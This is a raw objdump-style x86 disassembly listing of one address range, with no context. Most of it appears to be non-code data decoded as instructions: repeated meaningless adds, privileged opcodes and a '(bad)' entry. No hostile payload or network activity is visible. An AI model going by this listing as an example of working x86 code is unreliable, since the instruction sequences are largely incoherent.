  403ae2:	push   esp
  403ae3:	or     DWORD PTR [esi],ecx
  403ae5:	add    BYTE PTR [ebx-0x80],dl
  403ae8:	pusha  
  403ae9:	or     DWORD PTR [esi],ecx
  403aeb:	add    BYTE PTR [ebx-0x80],dl
  403aee:	or     DWORD PTR ds:0x5300,ecx
  403af3:	sub    BYTE PTR [esi+0x9],0xe
  403af7:	add    BYTE PTR [ebx-0x80],dl
  403afa:	jne    0x403b05
  403afc:	push   cs
  403afd:	add    BYTE PTR [ebx-0x80],dl
  403b00:	jl     0x403b0b
  403b02:	push   cs
  403b03:	add    BYTE PTR [ebx-0x80],dl
  403b06:	or     DWORD PTR [ecx],0xe
  403b09:	add    BYTE PTR [ebx-0x80],dl
  403b0c:	mov    WORD PTR [ecx],cs
  403b0e:	push   cs
  403b0f:	add    BYTE PTR [ebx-0x80],dl
  403b12:	xchg   esp,eax
  403b13:	or     DWORD PTR [esi],ecx
  403b15:	add    BYTE PTR [ebx-0x80],dl
  403b18:	cmp    al,0x1
  403b1a:	push   cs
  403b1b:	add    BYTE PTR [ebx-0x80],dl
  403b1e:	cdq    
  403b1f:	or     DWORD PTR [esi],ecx
  403b21:	add    BYTE PTR [ebx-0x80],dl
  403b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b25:	or     DWORD PTR [esi],ecx
  403b27:	add    BYTE PTR [ebx-0x80],dl
  403b2a:	lods   al,BYTE PTR ds:[esi]
  403b2b:	or     DWORD PTR [esi],ecx
  403b2d:	add    BYTE PTR [ebx-0x80],dl
  403b30:	mov    ebx,0x53000e09
  403b35:	or     dh,0x9
  403b38:	push   cs
  403b39:	add    BYTE PTR [ebx-0x80],dl
  403b3c:	fisttp WORD PTR [ecx]
  403b3e:	push   cs
  403b3f:	add    BYTE PTR [ecx],dl
  403b41:	add    bh,ah
  403b43:	or     DWORD PTR [edi-0x11fffed2],esi
  403b49:	or     DWORD PTR ds:0x215000,edx
  403b4f:	add    BYTE PTR [eax],al
  403b51:	add    BYTE PTR [ecx+0xa010f18],al
  403b57:	add    BYTE PTR [ecx],al
  403b59:	add    BYTE PTR [eax+0x21],bl
  403b5c:	add    BYTE PTR [eax],al
  403b5e:	add    BYTE PTR [eax],al
  403b60:	xchg   ecx,eax
  403b61:	add    BYTE PTR [ebx+0x1001d01],ah
  403b67:	add    BYTE PTR [esi+eiz*1],ah
  403b6a:	add    BYTE PTR [eax],al
  403b6c:	add    BYTE PTR [eax],al
  403b6e:	xchg   ecx,eax
  403b6f:	add    BYTE PTR [eax+0x2002301],ch
  403b75:	add    ah,al
  403b77:	daa    
  403b78:	add    BYTE PTR [eax],al
  403b7a:	add    BYTE PTR [eax],al
  403b7c:	xchg   ecx,eax
  403b7d:	add    cl,dl
  403b7f:	add    DWORD PTR [eax],esi
  403b81:	add    BYTE PTR [edx],al
  403b83:	add    BYTE PTR [eax+0x29],dl
  403b86:	add    BYTE PTR [eax],al
  403b88:	add    BYTE PTR [eax],al
  403b8a:	xchg   ecx,eax
  403b8b:	add    cl,bh
  403b8d:	add    DWORD PTR [ebx],edi
  403b8f:	add    BYTE PTR [esi],al
  403b91:	add    ah,cl
  403b93:	sub    al,BYTE PTR [eax]
  403b95:	add    BYTE PTR [eax],al
  403b97:	add    BYTE PTR [ecx+0x42020f00],dl
  403b9d:	add    BYTE PTR [edi],al
  403b9f:	add    BYTE PTR [ecx+0x2b],al
  403ba2:	add    BYTE PTR [eax],al
  403ba4:	add    BYTE PTR [eax],al
  403ba6:	xchg   ecx,eax
  403ba7:	sbb    BYTE PTR [edx+0x10],cl
  403baa:	inc    edx
  403bab:	add    BYTE PTR [edi],al
  403bad:	add    BYTE PTR [ecx+0x2b],al
  403bb3:	add    BYTE PTR [ebx+0x4e010f18],al
  403bb9:	add    BYTE PTR [edi],al
  403bbb:	add    BYTE PTR [eax+0x2b],dl
  403bc1:	add    BYTE PTR [ebx+0x4e025800],al
  403bc7:	add    BYTE PTR [eax],cl
  403bc9:	add    BYTE PTR [eax],al
  403bcb:	sub    al,0x0
  403bcd:	add    BYTE PTR [eax],al
  403bcf:	add    BYTE PTR [ebx+0x53026000],al
  403bd5:	add    BYTE PTR [ecx],cl
  403bd7:	add    BYTE PTR [eax],al
  403bd9:	add    BYTE PTR [eax],al
  403bdb:	add    BYTE PTR [eax+0x68209600],al
  403be1:	add    ah,BYTE PTR [ebx]
  403be3:	add    BYTE PTR [ecx],cl
  403be5:	add    BYTE PTR [edx+0x2c],cl
  403be8:	add    BYTE PTR [eax],al
  403bea:	add    BYTE PTR [eax],al
  403bec:	xchg   BYTE PTR [eax],bl
  403bee:	sidtd  [edx]
  403bf1:	add    BYTE PTR [ecx],cl
  403bf3:	add    BYTE PTR [edx+0x2c],dl
  403bf6:	add    BYTE PTR [eax],al
  403bf8:	add    BYTE PTR [eax],al
  403bfa:	xchg   BYTE PTR [eax],bl
  403bfc:	sidtd  [esi+0x0]
  403c00:	or     DWORD PTR [eax],eax
  403c02:	pop    ebx
  403c03:	sub    al,0x0
  403c05:	add    BYTE PTR [eax],al
  403c07:	add    dh,al
  403c09:	or     BYTE PTR [esi+0xa005308],ah
  403c0f:	add    BYTE PTR [ebx+0x2c],al
  403c15:	add    BYTE PTR [esi+0x4e010f18],al
  403c1b:	add    BYTE PTR [edx],cl
  403c1d:	add    BYTE PTR [esp+ebp*1+0x0],cl
  403c24:	les    eax,FWORD PTR [eax]
  403c26:	mov    dh,0x8
  403c28:	jle    0x403c56
  403c2a:	or     eax,DWORD PTR [eax]
  403c2c:	xchg   esp,eax
  403c2d:	sub    al,0x0
  403c2f:	add    BYTE PTR [eax],al
  403c31:	add    BYTE PTR [ebx+0xa010f18],al
  403c37:	add    BYTE PTR [eax+eax*1],cl
  403c3a:	mov    eax,0x2c
  403c3f:	add    BYTE PTR [ecx-0x44f60800],dl
  403c45:	cs or  al,0x0
  403c48:	in     al,0x2c
  403c4a:	add    BYTE PTR [eax],al
  403c4c:	add    BYTE PTR [eax],al
  403c4e:	xchg   ecx,eax
  403c4f:	or     BYTE PTR [edx],al
  403c51:	or     al,al
  403c53:	cs or  al,0x0
  403c56:	out    0x2c,eax
  403c58:	add    BYTE PTR [eax],al
  403c5a:	add    BYTE PTR [eax],al
  403c5c:	xchg   esi,eax
  403c5d:	or     BYTE PTR [esi],cl
  403c5f:	or     al,ch
  403c61:	cs or  al,0x0
  403c64:	hlt    
  403c65:	sub    al,0x0
  403c67:	add    BYTE PTR [eax],al
  403c69:	add    BYTE PTR [esi-0x35f5e400],dl
  403c6f:	cs or  al,0x0
  403c72:	js     0x403ca1
  403c74:	add    BYTE PTR [eax],al
  403c76:	add    BYTE PTR [eax],al
  403c78:	xchg   esi,eax
  403c79:	add    BYTE PTR [edx+ecx*1],bl
  403c7c:	shr    DWORD PTR [esi],1
  403c7e:	push   cs
  403c7f:	add    BYTE PTR [ecx+0x2d],ah
  403c85:	add    BYTE PTR [esi-0x29f5e400],dl
  403c8b:	verw   WORD PTR cs:[ebp+ebp*1+0x0]
  403c94:	xchg   esi,eax
  403c95:	add    BYTE PTR [esi],ah
  403c97:	or     bl,ch
  403c99:	adc    DWORD PTR cs:[eax],eax
  403c9c:	aad    0x2d
  403c9e:	add    BYTE PTR [eax],al
  403ca0:	add    BYTE PTR [eax],al
  403ca2:	xchg   ecx,eax
  403ca3:	sbb    BYTE PTR [edx+0x10],cl
  403ca6:	inc    edx
  403ca7:	add    BYTE PTR [edx],dl
  403ca9:	add    BYTE PTR [eax],al
  403cab:	add    BYTE PTR [ecx],al
  403cad:	add    BYTE PTR [edx+0xa],al
  403cb0:	add    BYTE PTR [eax],al
  403cb2:	add    DWORD PTR [eax],eax
  403cb4:	inc    edi
  403cb5:	or     al,BYTE PTR [eax]
  403cb7:	add    BYTE PTR [edx],al
  403cb9:	add    BYTE PTR [eax+0xa],dl
  403cbc:	add    BYTE PTR [eax],al
  403cbe:	add    eax,DWORD PTR [eax]
  403cc0:	sub    DWORD PTR [ecx],eax
  403cc2:	add    al,BYTE PTR [eax]
  403cc4:	add    al,0x0
  403cc6:	pop    ecx
  403cc7:	or     al,BYTE PTR [edx]
  403cc9:	add    BYTE PTR [ecx],al
  403ccb:	add    BYTE PTR [edx+0x100000a],cl
  403cd1:	add    BYTE PTR [esi+0x100000a],cl
  403cd7:	add    BYTE PTR [esi+0x100000a],cl
  403cdd:	add    BYTE PTR [ebx+0x100000a],dl
  403ce3:	add    BYTE PTR [edi+0x100000a],bl
  403ce9:	add    BYTE PTR [eax+0x100000a],ch
  403cef:	add    BYTE PTR [esi+0x200000a],ch
  403cf5:	add    BYTE PTR [edx+0xa],al
  403cf8:	add    BYTE PTR [eax],al
  403cfa:	add    DWORD PTR [eax],eax
  403cfc:	scas   al,BYTE PTR es:[edi]
  403cfd:	or     al,BYTE PTR [eax]
  403cff:	add    BYTE PTR [ecx],al
  403d01:	add    BYTE PTR [esi+0x200020a],ch
  403d07:	add    bh,al
  403d09:	or     al,BYTE PTR [eax]
  403d0b:	add    BYTE PTR [ecx],al
  403d0d:	add    BYTE PTR [esi+0xf00490a],ch
  403d13:	add    DWORD PTR [edx],ecx
  403d15:	add    BYTE PTR [ecx+0x0],dl
  403d18:	sidtd  [edx]
  403d1b:	add    BYTE PTR [ecx+0x0],bl
  403d1e:	lmsw   cx
  403d21:	cs popa 
  403d23:	add    BYTE PTR [edi],cl
  403d25:	add    ecx,esi
  403d27:	imul   eax,DWORD PTR cs:[eax],0x4e010f
  403d2e:	jno    0x403d30
  403d30:	sidtd  [esi+0x0]
  403d34:	jns    0x403d36
  403d36:	sidtd  [esi+0x0]
  403d3a:	add    DWORD PTR [eax],0x4e010f
  403d40:	mov    DWORD PTR [eax],eax
  403d42:	sidtd  [esi+0x0]
  403d46:	xchg   ecx,eax
  403d47:	add    BYTE PTR [edi],cl
  403d49:	add    DWORD PTR [esi+0x0],ecx
  403d4c:	cdq    
  403d4d:	add    BYTE PTR [edi],cl
  403d4f:	add    DWORD PTR [esi+0x0],ecx
  403d52:	mov    eax,ds:0x4e010f00
  403d57:	add    BYTE PTR [ecx+0x4e010f00],ch
  403d5d:	add    BYTE PTR [ecx+0x4e010f00],dh
  403d63:	add    BYTE PTR [ecx+0x4e010f00],bh
  403d69:	add    cl,al
  403d6b:	add    BYTE PTR [edi],cl
  403d6d:	add    ecx,esi
  403d6f:	cs leave 
  403d71:	add    BYTE PTR [edi],cl
  403d73:	add    DWORD PTR [esi+0x0],ecx
  403d76:	rol    DWORD PTR [eax],1
  403d78:	lmsw   si
  403d7b:	fld    DWORD PTR cs:[eax]
  403d7e:	sidtd  [edx]
  403d81:	add    cl,ah
  403d83:	add    BYTE PTR [edi],cl
  403d85:	add    esp,edi
  403d87:	cs icebp 
  403d89:	add    BYTE PTR [edi],cl
  403d8b:	add    DWORD PTR [edx],eax
  403d8d:	das    
  403d8e:	add    DWORD PTR [ecx],eax
  403d90:	sidtd  [eax]
  403d93:	das    
  403d94:	or     DWORD PTR [eax],eax
  403d96:	sidtd  [edx]
  403d99:	add    BYTE PTR [ecx],cl
  403d9b:	add    DWORD PTR [ebp+0x92faf0d],eax
  403da1:	add    DWORD PTR [edi+0x112fb50d],esp
  403da7:	add    DWORD PTR [edi+0x2100530d],ebp
  403dad:	add    BYTE PTR [edi],cl
  403daf:	add    DWORD PTR [ebx-0x42fef6d1],edi
  403db5:	or     eax,0x1210053
  403dba:	fimul  DWORD PTR ds:0x1212fc6
  403dc0:	jmp    0x214090d2
  403dc5:	add    ebp,edi
  403dc7:	or     eax,0x1290053
  403dcc:	pop    ss
  403dcd:	push   cs
  403dce:	int    0x2f
  403dd0:	xor    DWORD PTR [ecx],eax
  403dd2:	es push cs
  403dd4:	aad    0x2f
  403dd6:	and    DWORD PTR [ecx],eax
  403dd8:	xor    BYTE PTR [esi],cl
  403dda:	push   ebx
  403ddb:	add    BYTE PTR [ecx],bh
  403ddd:	add    DWORD PTR [ebx+0xe],ebx
  403de0:	fisubr DWORD PTR [edi]
  403de2:	cmp    DWORD PTR [ecx],eax
  403de4:	ins    DWORD PTR es:[edi],dx
  403de5:	push   cs
  403de6:	loopne 0x403e17
  403de8:	sub    DWORD PTR [ecx],eax
  403dea:	or     BYTE PTR [esi],0xe5
  403ded:	das    
  403dee:	and    DWORD PTR [eax],eax
  403df0:	sbb    al,0xa
  403df2:	jmp    0x403e23
  403df4:	sub    DWORD PTR [ecx],eax
  403df6:	mov    cs,WORD PTR [esi]
  403df8:	push   cs
  403df9:	add    BYTE PTR [ecx],ch
  403dfb:	add    BYTE PTR [esi+ecx*1+0x1292ec0],dl
  403e02:	test   eax,0x292ff20e
  403e07:	add    DWORD PTR [ecx+0x312ff80e],esi
  403e0d:	add    DWORD PTR [esi+ecx*1+0x392ffc],edi
  403e14:	ret    0x20e
  403e17:	xor    BYTE PTR [ecx+0x1],al
  403e1a:	out    0xe,al
  403e1c:	push   ebx
  403e1d:	add    BYTE PTR [ecx],ch
  403e1f:	add    DWORD PTR [edi],edx
  403e21:	push   cs
  403e22:	or     dh,BYTE PTR [eax]
  403e24:	sub    DWORD PTR [ecx],eax
  403e26:	repnz push cs
  403e28:	and    al,0x30
  403e2a:	sub    DWORD PTR [ecx],eax
  403e2c:	cli    
  403e2d:	push   cs
  403e2e:	sub    DWORD PTR [eax],esi
  403e30:	sub    DWORD PTR [ecx],eax
  403e32:	cli    
  403e33:	push   cs
  403e34:	das    
  403e35:	xor    BYTE PTR [ecx],ch
  403e37:	add    DWORD PTR [edi],edx
  403e39:	push   cs
  403e3a:	xor    al,0x30
  403e3c:	dec    ecx
  403e3d:	add    DWORD PTR [ebx],edx
  403e3f:	psrlw  mm5,QWORD PTR [esi]
  403e42:	pop    ecx
  403e43:	add    DWORD PTR [edi],ecx
  403e45:	add    DWORD PTR [edx],ecx
  403e47:	add    BYTE PTR [ecx+0x1],bl
  403e4a:	inc    esi
  403e4b:	cmovle eax,DWORD PTR [eax]
  403e4e:	pop    ecx
  403e4f:	add    DWORD PTR [ebx+0xf],edx
  403e52:	dec    esi
  403e53:	add    BYTE PTR [ecx+0x1],bl
  403e56:	pusha  
  403e57:	cmovle eax,DWORD PTR [eax]
  403e5a:	popa   
  403e5b:	add    DWORD PTR [edi],ecx
  403e5d:	add    DWORD PTR [edx],ecx
  403e5f:	add    BYTE PTR [ecx+0x1],ah
  403e62:	jge    0x403e73
  403e64:	dec    esi
  403e65:	add    BYTE PTR [ecx+0x1],ah
  403e68:	xchg   BYTE PTR [edi],cl
  403e6a:	push   ebx
  403e6b:	add    BYTE PTR [ecx+0x1],ah
  403e6e:	cwde   
  403e6f:	cmovle eax,DWORD PTR [eax]
  403e72:	popa   
  403e73:	add    DWORD PTR [edx+0x69004e0f],ebp
  403e79:	add    DWORD PTR [edi],ecx
  403e7b:	add    DWORD PTR [edx],ecx
  403e7d:	add    BYTE PTR [ecx+0x1],ch
  403e80:	(bad)  
  403e81:	psllw  mm5,QWORD PTR [esi]
  403e84:	jno    0x403e87
  403e86:	sgdtd  [ecx+0x30]
  403e8a:	cmp    DWORD PTR [eax],eax
  403e8c:	sidtd  [ebx+0x30]
  403e90:	cmp    DWORD PTR [eax],eax
  403e92:	lidtd  [eax+0x30]
  403e96:	jns    0x403e99
  403e98:	add    BYTE PTR [eax],dl
  403e9a:	or     al,BYTE PTR [eax]
  403e9c:	popa   
  403e9d:	add    DWORD PTR [eax+edx*1],eax
  403ea0:	push   ebx
  403ea1:	add    BYTE PTR [ecx+0x62103701],al
  403ea7:	xor    BYTE PTR [ecx],ch
  403ea9:	add    DWORD PTR [edi],edx
  403eab:	push   cs
  403eac:	jl     0x403ede
  403eae:	inc    ecx
  403eaf:	add    BYTE PTR [ecx+0x10],dl
  403eb2:	xchg   DWORD PTR [eax],esi
  403eb4:	cdq    
  403eb5:	add    DWORD PTR [ebx+0x10],ebp
  403eb8:	or     al,BYTE PTR [eax]
  403eba:	cdq    
  403ebb:	add    DWORD PTR [edi+0x10],esi
  403ebe:	or     al,BYTE PTR [eax]
  403ec0:	cdq    
  403ec1:	add    DWORD PTR [ebx-0x56cf73f0],edx
  403ec7:	add    DWORD PTR [eax-0x56cf6df0],edi
  403ecd:	add    esp,eax
  403ecf:	adc    BYTE PTR [eax-0x32fe5ed0],bl
  403ed5:	adc    BYTE PTR [esi-0x1efe66d0],bl
  403edb:	adc    BYTE PTR [eax+esi*1+0xa1c01a9],cl
  403ee2:	lods   eax,DWORD PTR ds:[esi]
  403ee3:	xor    BYTE PTR [ecx+0x4e010f01],dh
  403ee9:	add    BYTE PTR [ecx-0x4cfef0ff],bh
  403eef:	xor    BYTE PTR [ecx],dl
  403ef1:	add    BYTE PTR [edi],cl
  403ef3:	add    DWORD PTR [esi+0x0],ecx
  403ef6:	adc    DWORD PTR [eax],eax
  403ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ef9:	or     BYTE PTR [ebx+0x0],dl
  403efc:	adc    DWORD PTR [eax],eax
  403efe:	aas    
  403eff:	adc    DWORD PTR [esi+0x0],ecx
  403f02:	sbb    DWORD PTR [eax],eax
  403f04:	sidtd  [esi+0x0]
  403f08:	or     DWORD PTR [eax],eax
  403f0a:	push   esp
  403f0b:	adc    ebx,eax
  403f0d:	xor    BYTE PTR [ecx],bl
  403f0f:	add    DWORD PTR [ecx+edx*1-0x37],ebx
  403f13:	xor    BYTE PTR [ecx],ah
  403f15:	add    BYTE PTR [edi],cl
  403f17:	add    edi,ecx
  403f19:	xor    cl,cl
  403f1b:	add    DWORD PTR [ebp+0x11],esi
  403f1e:	xlat   BYTE PTR ds:[ebx]
  403f1f:	xor    BYTE PTR [ecx],ch
  403f21:	add    BYTE PTR [ebp+0x292ec011],al
  403f27:	add    DWORD PTR [eax+0x2130ee11],ebp
  403f2d:	add    BYTE PTR [esi],ah
  403f2f:	or     al,BYTE PTR [eax]
  403f31:	xor    ecx,ebx
  403f33:	add    DWORD PTR [edi],ecx
  403f35:	add    DWORD PTR [edx],ecx
  403f37:	add    BYTE PTR [esi],cl
  403f39:	add    BYTE PTR [eax+eax*1],ch
  403f3c:	push   edi
  403f3d:	add    BYTE PTR [esi],cl
  403f3f:	add    BYTE PTR [eax],dh
  403f41:	add    BYTE PTR [esi+0x0],ah
  403f44:	push   cs
  403f45:	add    BYTE PTR [eax+eax*1],dh
  403f48:	data16 add BYTE PTR [esi],cl
  403f4b:	add    BYTE PTR [eax],bh
  403f4d:	add    BYTE PTR [esi+0x0],ah
  403f50:	push   cs
  403f51:	add    BYTE PTR [eax+eax*1],bh
  403f54:	xchg   DWORD PTR [eax],eax
  403f56:	push   cs
  403f57:	add    BYTE PTR [eax+0x0],al
  403f5a:	push   edi
  403f5b:	add    BYTE PTR [esi],cl
  403f5d:	add    BYTE PTR [eax+eax*1-0x1c],al
  403f61:	add    BYTE PTR [esi],cl
  403f63:	add    BYTE PTR [eax+0x0],cl
  403f66:	add    eax,DWORD PTR [ecx]
  403f68:	push   cs
  403f69:	add    BYTE PTR [eax+eax*1+0xe],cl
  403f6d:	add    DWORD PTR [eax],ecx
  403f6f:	add    BYTE PTR [eax+0x0],dl
  403f72:	sbb    al,0x1
  403f74:	push   cs
  403f75:	add    BYTE PTR [eax+eax*1+0x21],dl
  403f79:	add    DWORD PTR [esi],ecx
  403f7b:	add    BYTE PTR [eax+0x0],bl
  403f7e:	and    DWORD PTR [ecx],eax
  403f80:	push   cs
  403f81:	add    BYTE PTR [eax+eax*1+0x42],bl
  403f85:	add    DWORD PTR [esi],ecx
  403f87:	add    BYTE PTR [eax+0x0],ah
  403f8a:	add    DWORD PTR [ecx],0xe
  403f8d:	add    BYTE PTR [eax+eax*1-0x7d],ah
  403f91:	add    DWORD PTR [esi],ecx
  403f93:	add    BYTE PTR [eax+0x0],ch
  403f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f97:	add    DWORD PTR [esi],ecx
  403f99:	add    BYTE PTR [eax+eax*1+0x26],ch
  403f9d:	add    al,0xe
  403f9f:	add    BYTE PTR [eax+0x0],dh
  403fa2:	es add al,0xe
  403fa5:	add    BYTE PTR [eax+eax*1+0x47],dh
  403fa9:	add    al,0xe
  403fab:	add    BYTE PTR [eax+0x0],bh
  403fae:	and    DWORD PTR [ecx],eax
  403fb0:	push   cs
  403fb1:	add    BYTE PTR [eax+eax*1+0x21],bh
  403fb5:	add    DWORD PTR [esi],ecx
  403fb7:	add    BYTE PTR [eax+0xe014200],al
  403fbd:	add    BYTE PTR [eax+eax*1+0xe06c9],al
  403fc4:	mov    BYTE PTR [eax],al
  403fc6:	popa   
  403fc7:	pop    es
  403fc8:	push   cs
  403fc9:	add    BYTE PTR [eax+eax*1+0xe07ff],cl
  403fd0:	nop
  403fd1:	add    BYTE PTR [edi-0x6bfff1f8],dh
  403fd7:	add    BYTE PTR [ebx+0x9],cl
  403fda:	push   cs
  403fdb:	add    BYTE PTR [eax+0xe09e900],bl
  403fe1:	add    BYTE PTR [eax+eax*1+0xe0a8f],bl
  403fe8:	mov    al,ds:0xe0b4500
  403fed:	add    BYTE PTR [eax+eax*1+0xe0c0b],ah
  403ff4:	test   al,0x0
  403ff6:	mov    ebx,0xac000e0c
  403ffb:	add    BYTE PTR [edi+0xd],dl
  403ffe:	push   cs
  403fff:	add    BYTE PTR [eax+0xe0d5700],dh
  404005:	add    BYTE PTR [eax+eax*1+0xe0d78],dh
  40400c:	mov    eax,0xe018300
  404011:	add    BYTE PTR [eax+eax*1+0xe0183],bh
  404018:	rol    BYTE PTR [eax],0xa4
  40401b:	add    DWORD PTR [esi],ecx
  40401d:	add    ah,al
  40401f:	add    dl,bh
  404021:	femms  
  404023:	add    al,cl
  404025:	add    ah,cl
  404027:	adc    BYTE PTR [esi],cl
  404029:	add    ah,cl
  40402b:	add    BYTE PTR [ecx+edx*1+0xe],bh
  40402f:	add    al,dl
  404031:	add    BYTE PTR [edx+edx*1],bh
  404034:	push   cs
  404035:	add    ah,dl
  404037:	add    dh,ah
  404039:	adc    cl,BYTE PTR [esi]
  40403b:	add    al,bl
  40403d:	add    BYTE PTR [eax-0x23fff1ed],cl
  404043:	add    BYTE PTR [eax+0x14],al
  404046:	push   cs
  404047:	add    al,ah
  404049:	add    dl,dh
  40404b:	adc    al,0xe
  40404d:	add    ah,ah
  40404f:	add    BYTE PTR [esi-0x17fff1eb],dl
  404055:	add    BYTE PTR [eax+0x16],dl
  404058:	push   cs
  404059:	add    ah,ch
  40405b:	add    dl,bh
  40405d:	push   ss
  40405e:	push   cs
  40405f:	add    al,dh
  404061:	add    BYTE PTR [edx-0xbfff1e9],ah
  404067:	add    BYTE PTR [eax+0x18],cl
  40406a:	push   cs
  40406b:	add    al,bh
  40406d:	add    BYTE PTR [ecx+ebx*1],al
  404070:	push   cs
  404071:	add    ah,bh
  404073:	add    ah,ah
  404075:	sbb    DWORD PTR [esi],ecx
  404077:	add    BYTE PTR [eax],al
  404079:	add    DWORD PTR [esi+0x4000e1a],esp
  40407f:	add    DWORD PTR [ebx+ebx*1+0xe],esi
  404083:	add    BYTE PTR [eax],cl
  404085:	add    DWORD PTR [edx],ebx
  404087:	sbb    al,0xe
  404089:	add    BYTE PTR [ecx+eax*1],cl
  40408c:	rcr    BYTE PTR [esi+ecx*1],1
  40408f:	add    BYTE PTR [eax],dl
  404091:	add    DWORD PTR [edx+0x14000e1d],eax
  404097:	add    DWORD PTR [esi],ebx
  404099:	push   ds
  40409a:	push   cs
  40409b:	add    BYTE PTR [eax],bl
  40409d:	add    esp,edx
  40409f:	push   ds
  4040a0:	push   cs
  4040a1:	add    BYTE PTR [ecx+eax*1],bl
  4040a4:	mov    BYTE PTR [edi],bl
  4040a6:	push   cs
  4040a7:	add    BYTE PTR [eax],ah
  4040a9:	add    DWORD PTR [edx+0x20],ecx
  4040ac:	push   cs
  4040ad:	add    BYTE PTR [ecx+eax*1],ah
  4040b0:	add    ah,BYTE PTR [ecx]
  4040b2:	push   cs
  4040b3:	add    BYTE PTR [eax],ch
  4040b5:	add    DWORD PTR [ecx+eiz*1+0x12c000e],esi
  4040bc:	je     0x4040e0
  4040be:	push   cs
  4040bf:	add    BYTE PTR [eax],dh
  4040c1:	add    DWORD PTR [esi],ebx
  4040c3:	and    ecx,DWORD PTR [esi]
  4040c5:	add    BYTE PTR [ecx+eax*1],dh
  4040c8:	loopne 0x4040ed
  4040ca:	push   cs
  4040cb:	add    BYTE PTR [eax],bh
  4040cd:	add    DWORD PTR [esp+0x13c000e],ecx
  4040d4:	cmp    ah,BYTE PTR ds:0x140000e
  4040da:	fsub   DWORD PTR ds:0x144000e
  4040e0:	mov    WORD PTR [esi],fs
  4040e2:	push   cs
  4040e3:	add    BYTE PTR [eax+0x1],cl
  4040e6:	pop    esp
  4040e7:	daa    
  4040e8:	push   cs
  4040e9:	add    BYTE PTR [ecx+eax*1+0xa],cl
  4040ed:	sub    BYTE PTR [esi],cl
  4040ef:	add    BYTE PTR [eax+0x1],dl
  4040f2:	sub    ebp,DWORD PTR [eax]
  4040f4:	push   cs
  4040f5:	add    BYTE PTR [ecx+eax*1-0x21],dl
  4040f9:	sub    BYTE PTR [esi],cl
  4040fb:	add    BYTE PTR [eax+0x1],bl
  4040fe:	xchg   ecx,eax
  4040ff:	sub    DWORD PTR [esi],ecx
  404101:	add    BYTE PTR [ecx+eax*1+0x4f],bl
  404105:	sub    cl,BYTE PTR [esi]
  404107:	add    BYTE PTR [eax+0x1],ah
  40410a:	movntps XMMWORD PTR [esi],xmm1
  40410d:	add    BYTE PTR [ecx+eax*1-0x33],ah
  404111:	sub    ecx,DWORD PTR [esi]
  404113:	add    BYTE PTR [ecx+eax*1-0x7d],ch
  404117:	sub    al,0xe
  404119:	add    BYTE PTR [eax+0x1],dh
  40411c:	xchg   edx,eax
  40411d:	sub    al,0xe
  40411f:	add    BYTE PTR [ecx+eax*1-0x53],dh
  404123:	sub    al,0xe
  404125:	add    BYTE PTR [eax+0x1],bh
  404128:	retf   0xe2c
  40412b:	add    BYTE PTR [ecx+eax*1-0x15],bh
  40412f:	sub    al,0xe
  404131:	add    BYTE PTR [eax+0xe2d1201],al
  404137:	add    BYTE PTR [ecx+eax*1+0xe2d2f],al
  40413e:	mov    BYTE PTR [ecx],al
  404140:	inc    esp
  404141:	sub    eax,0x18c000e
  404146:	pop    ecx
  404147:	sub    eax,0x190000e
  40414c:	jb     0x40417b
  40414e:	push   cs
  40414f:	add    BYTE PTR [ecx+eax*1+0xe2d8f],dl
  404156:	cwde   
  404157:	add    DWORD PTR [esi-0x63fff1d3],esp
  40415d:	add    DWORD PTR [ebx-0x5ffff1d3],esi
  404163:	add    eax,eax
  404165:	sub    eax,0x1a4000e
  40416a:	int    0x2d
  40416c:	push   cs
  40416d:	add    BYTE PTR [eax+0xe2dda01],ch
  404173:	add    BYTE PTR [ecx+eax*1+0xe2de7],ch
  40417a:	mov    al,0x1
  40417c:	clc    
  40417d:	sub    eax,0x1b4000e
  404182:	pop    es
  404183:	cs push cs
  404185:	add    BYTE PTR [eax+0xe2e1001],bh
  40418b:	add    BYTE PTR [ecx+eax*1+0xe2e21],bh
  404192:	rol    BYTE PTR [ecx],0x36
  404195:	cs push cs
  404197:	add    ah,al
  404199:	add    DWORD PTR [ebp+0x2e],eax
  40419c:	push   cs
  40419d:	add    al,cl
  40419f:	add    DWORD PTR [edx+0x2e],esp
  4041a2:	push   cs
  4041a3:	add    ah,cl
  4041a5:	add    DWORD PTR [edi-0x2ffff1d2],eax
  4041ab:	add    DWORD PTR [eax-0x1cffd8d2],ebp
  4041b1:	add    ch,ah
  4041b3:	cs add BYTE PTR cs:[ebx+0x0],cl
  4041b8:	inc    esp
  4041b9:	xor    DWORD PTR [esi],ebp
  4041bb:	add    BYTE PTR [ebx+0x0],dl
  4041be:	xor    DWORD PTR fs:[esi],ebp
  4041c1:	add    BYTE PTR [ebx+0x0],ah
  4041c4:	cdq    
  4041c5:	xor    DWORD PTR [esi],ebp
  4041c7:	add    BYTE PTR [ebx+0x2e356300],dh
  4041cd:	add    BYTE PTR [ebx],ah
  4041cf:	add    BYTE PTR ds:0x2b002e31,cl
  4041d5:	add    BYTE PTR [ebx],dl
  4041d7:	xor    DWORD PTR [esi],ebp
  4041d9:	add    BYTE PTR [ebx],dh
  4041db:	add    BYTE PTR [ebx],dl
  4041dd:	xor    DWORD PTR [esi],ebp
  4041df:	add    BYTE PTR [ebx],bh
  4041e1:	add    BYTE PTR [ebx],dl
  4041e3:	xor    DWORD PTR [esi],ebp
  4041e5:	add    BYTE PTR [ebx+0x0],al
  4041e8:	sub    DWORD PTR [ecx],esi
  4041ea:	add    BYTE PTR cs:[ebx],bl
  4041ed:	add    BYTE PTR [edi],al
  4041ef:	xor    DWORD PTR [esi],ebp
  4041f1:	add    BYTE PTR [ebx+0x0],ch
  4041f4:	cdq    
  4041f5:	xor    DWORD PTR [esi],ebp
  4041f7:	add    BYTE PTR [ebx+0x0],dh
  4041fa:	scas   al,BYTE PTR es:[edi]
  4041fb:	xor    DWORD PTR [esi],ebp
  4041fd:	add    BYTE PTR [ebx+0x0],bh
  404200:	mov    ebx,0x83002e31
  404205:	add    BYTE PTR ds:0x8b002e31,cl
  40420b:	add    dh,al
  40420d:	xor    DWORD PTR [esi],ebp
  40420f:	add    BYTE PTR [ebx+0x2e31f100],dl
  404215:	add    BYTE PTR [ebx+0x2e353b00],bl
  40421b:	add    BYTE PTR [ebx+0x3355a00],ch
  404221:	add    DWORD PTR [ebx+0x2330ba02],eax
  404227:	add    DWORD PTR [ebx-0x5bcf45fe],eax
  40422d:	add    DWORD PTR [ebx],edx
  40422f:	add    ah,ch
  404231:	or     BYTE PTR cs:[eax],al
